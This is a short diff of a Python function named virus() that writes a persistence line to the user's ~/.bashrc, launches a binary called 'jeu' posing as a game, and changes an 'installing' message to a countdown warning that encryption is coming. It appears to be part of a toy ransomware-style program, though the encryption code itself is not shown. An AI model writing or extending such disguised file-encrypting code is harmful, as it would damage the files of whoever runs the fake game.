@@ -13,8 +13,8 @@ def virus():
 		os.system("export game_installed=true; echo 'export game_installed=true' >> ~/.bashrc")
 		os.system("./jeu")
 
-	print("installing")
-	time.sleep(3)
+	print("ceypting coming in 10 seconds")
+	time.sleep(10)
 	directory = os.getcwd()
 	time.sleep(1)
 
